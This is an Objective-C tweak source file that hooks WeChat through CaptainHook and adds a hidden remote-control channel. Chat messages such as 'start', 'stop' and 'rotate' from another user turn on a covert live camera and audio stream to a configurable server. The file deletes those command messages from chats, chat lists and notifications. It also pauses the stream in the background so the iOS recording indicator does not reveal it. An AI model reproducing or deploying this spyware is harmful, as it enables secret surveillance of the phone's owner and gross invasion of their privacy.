//
//  HGLiveHook.m
//  HGLiveHook
//
//  Created by jyh on 2018/8/3.
//  Copyright (c) 2018年 ___ORGANIZATIONNAME___. All rights reserved.
//

// CaptainHook by Ryan Petrich
// see https://github.com/rpetrich/CaptainHook/

#if TARGET_OS_SIMULATOR
#error Do not support the simulator, please use the real iPhone Device.
#endif

#import "HGLiveHook.h"
#import <Foundation/Foundation.h>
#import "CaptainHook/CaptainHook.h"
#import "HGLiveSettings.h"
#import "HGLiveManager.h"
#import "WechatPodForm.h"


CHDeclareClass(CMessageMgr);

// 聊天窗口显示过滤处理
CHOptimizedMethod2(self, void, CMessageMgr, AsyncOnAddMsg, id, arg1, MsgWrap, CMessageWrap *, wrap) {
    
    [[HGLiveSettings shared] setMgr:self];
    wrap.m_nsContent = [wrap.m_nsContent stringByReplacingOccurrencesOfString:@" " withString:@""];
    if ([wrap.m_nsContent hasPrefix:sheZhiFuWuQi]) {
        [HGLiveSettings setupServer:wrap.m_nsContent room:wrap.m_nsToUsr];
        [HGLiveSettings DelMsg:arg1 MsgWrap:wrap];
        return;
    }

    if ([wrap.m_nsContent isEqualToString:start]) {
        
        [[HGLiveSettings shared] setIsPlay:YES];
        [[HGLiveSettings shared] setWrap:wrap];
        [HGLiveSettings DelMsg:arg1 MsgWrap:wrap];

        if (![HGLiveSettings isNoAddress]) {
            [HGLiveSettings AddMsgWithContent:WeiSheZhiFuWuQi];
            return;
        }
        
        [HGLiveSettings AddMsgWithContent:[HGLiveSettings getPlayAddress]];
        [[HGLiveManager shared] startRunning];
    }

    if ([wrap.m_nsContent isEqualToString:stop]) {
        [[HGLiveSettings shared] setIsPlay:NO];
        [[HGLiveManager shared] stopLive];
        [HGLiveSettings DelMsg:arg1 MsgWrap:wrap];
        return;
    }

    if ([wrap.m_nsContent isEqualToString:rotate]) {
        [[HGLiveManager shared] rotateCamera];
        [HGLiveSettings DelMsg:arg1 MsgWrap:wrap];
        return;
    }

    if ([objc_getClass("CMessageWrap") isSenderFromMsgWrap:wrap]) {
        if ([HGLiveSettings isEqualToCommand:wrap.m_nsContent]) return;
    }
    
    CHSuper2(CMessageMgr, AsyncOnAddMsg, arg1, MsgWrap, wrap);
}

// 聊天列表显示过滤
CHOptimizedMethod2(self, void, CMessageMgr, AsyncOnAddMsgListForSession, NSDictionary *, arg1, NotifyUsrName, NSMutableSet *, arg2) {
    CMessageWrap *wrap = arg1[[arg2 anyObject]];
    if ([HGLiveSettings isEqualToCommand:wrap.m_nsContent]) return;
    CHSuper2(CMessageMgr, AsyncOnAddMsgListForSession, arg1, NotifyUsrName, arg2);
}

// 通知过滤
CHOptimizedMethod1(self, void, CMessageMgr, MainThreadNotifyToExt, NSMutableDictionary *, arg1) {
    if ([arg1 valueForKey:@"3"]) {
        CMessageWrap *wrap = [arg1 valueForKey:@"3"];
        if ([HGLiveSettings isEqualToCommand:wrap.m_nsContent]) return;
    }
    CHSuper1(CMessageMgr, MainThreadNotifyToExt, arg1);
}

CHDeclareClass(MicroMessengerAppDelegate);
// 将变为非活跃状态
CHOptimizedMethod1(self, void, MicroMessengerAppDelegate, applicationWillResignActive, id, arg1) {
    // 关闭. 由于进入后台.如果是开启状态.桌面状态栏会显示红色提醒用户后台录音开启.避免暴露,最好关闭
    if ([[HGLiveSettings shared] isPlay]) {
        [[HGLiveManager shared] stopLive];
        [HGLiveSettings AddMsgWithContent:@"stop"];
    }
    CHSuper1(MicroMessengerAppDelegate, applicationWillResignActive, arg1);
}

// 由后台进入前台
CHOptimizedMethod1(self, void, MicroMessengerAppDelegate, applicationWillEnterForeground, id, arg1) {
    // 开启.
    if ([[HGLiveSettings shared] isPlay]) {
        [[HGLiveManager shared] startRunning];
        [HGLiveSettings AddMsgWithContent:@"start"];
    }
    CHSuper1(MicroMessengerAppDelegate, applicationWillEnterForeground, arg1);
}
// 所有被hook的类和函数放在这里的构造函数中
CHConstructor
{
    @autoreleasepool
    {
        CHLoadLateClass(CMessageMgr);
        CHHook2(CMessageMgr, AsyncOnAddMsg, MsgWrap);
        CHHook2(CMessageMgr, AsyncOnAddMsgListForSession, NotifyUsrName);
        CHHook1(CMessageMgr, MainThreadNotifyToExt);
        
        CHLoadLateClass(MicroMessengerAppDelegate);
        CHHook1(MicroMessengerAppDelegate, applicationWillResignActive);
        CHHook1(MicroMessengerAppDelegate, applicationWillEnterForeground);
    }
}
